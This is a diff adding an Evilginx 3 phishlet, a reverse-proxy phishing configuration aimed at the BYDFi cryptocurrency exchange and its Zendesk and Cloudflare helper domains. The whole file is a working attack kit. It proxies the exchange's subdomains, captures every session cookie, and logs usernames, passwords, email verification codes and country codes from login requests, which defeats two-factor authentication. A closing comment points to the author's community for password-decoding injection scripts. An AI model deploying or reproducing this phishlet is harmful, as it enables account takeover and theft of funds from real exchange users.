@@ -1,0 +1,66 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'bydfi.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bydfi.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'partner', orig_sub: 'partner', domain: 'bydfi.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'uploads', orig_sub: 'uploads', domain: 'bydfi.in', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fquote', orig_sub: 'fquote', domain: 'bydfi.pro', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'quote', orig_sub: 'quote', domain: 'bydfi.pro', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'zdassets.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ekr', orig_sub: 'ekr', domain: 'zdassets.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'bydfi', orig_sub: 'bydfi', domain: 'zendesk.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'cloudflareinsights.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.bydfi.com', orig_sub: 'www', domain: 'bydfi.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['', 'text/plain', 'text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'bydfi.com', orig_sub: '', domain: 'bydfi.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'partner.bydfi.com', orig_sub: 'partner', domain: 'bydfi.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'uploads.bydfi.in', orig_sub: 'uploads', domain: 'bydfi.in', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'fquote.bydfi.pro', orig_sub: 'fquote', domain: 'bydfi.pro', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'quote.bydfi.pro', orig_sub: 'quote', domain: 'bydfi.pro', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'static.zdassets.com', orig_sub: 'static', domain: 'zdassets.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'bydfi.zdassets.com', orig_sub: 'bydfi', domain: 'zdassets.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  
+  
+auth_tokens:
+  - domain: 'www.bydfi.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.bydfi.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.bydfi.in'
+    keys: ['.*,regexp']
+    type: 'cookie'  
+
+auth_urls:
+  - '/en'
+  - '/'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'    
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'    
+    type: 'post'
+  custom:
+    key: 'email_code'
+    search: '(.*)'    
+    type: 'post'
+  custom:
+    key: 'countryCode'
+    search: '(.*)'    
+    type: 'post'
+ 
+
+login:
+  domain: 'www.bydfi.com'
+  path: '/en/login'
+
+#js_inject to decode a captured password, you can write and test it yourself or get it from our community EvilGinx Lab by EvilGrey5.
+
